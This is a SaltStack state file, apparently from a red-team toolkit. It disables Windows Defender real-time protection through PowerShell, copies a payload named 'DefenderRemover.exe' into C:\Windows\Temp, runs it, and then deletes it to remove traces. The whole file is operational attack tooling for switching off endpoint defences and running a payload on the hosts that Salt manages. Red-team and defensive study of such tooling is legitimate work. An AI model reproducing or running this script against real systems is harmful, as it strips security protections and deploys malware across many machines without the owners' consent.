# EDIT THIS LINE: Name of the file in salt://payloads/
{% set filename = 'DefenderRemover.exe' %}

# Destination path (Windows)
{% set dest = 'C:\\Windows\\Temp\\' ~ filename %}

disable_defender:
  cmd.run:
    - name: powershell -command "Set-MpPreference -DisableRealtimeMonitoring 1"
    - shell: powershell

copy_payload:
  file.managed:
    - name: {{ dest }}
    - source: salt://redteam/{{ filename }}
    - makedirs: True
    - require:
      - cmd: disable_defender

execute_payload:
  cmd.run:
    - name: {{ dest }} /r
    - require:
      - file: copy_payload

remove_payload:
  file.absent:
    - name: {{ dest }}
    - require:
      - cmd: execute_payload

